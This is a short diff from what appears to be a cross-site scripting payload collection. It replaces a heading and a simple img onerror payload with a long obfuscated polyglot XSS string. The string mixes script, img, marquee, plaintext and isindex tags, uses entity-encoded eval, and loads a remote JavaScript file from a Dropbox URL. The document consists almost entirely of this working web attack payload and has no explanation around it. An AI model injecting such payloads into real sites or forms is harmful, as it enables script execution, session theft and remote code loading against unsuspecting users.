@@ -1,4 +1,1 @@
----img-src-x-onerror-confirm-1---
-=================================
-
-">&lt;img src=x onerror=confirm(1);>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>"><script>alert(document.domain)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://bryanhallsawakening.files.wordpress.com/2013/09/anonymousbigbrotherclone.jpg"/ onmousover=alert(1)><script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
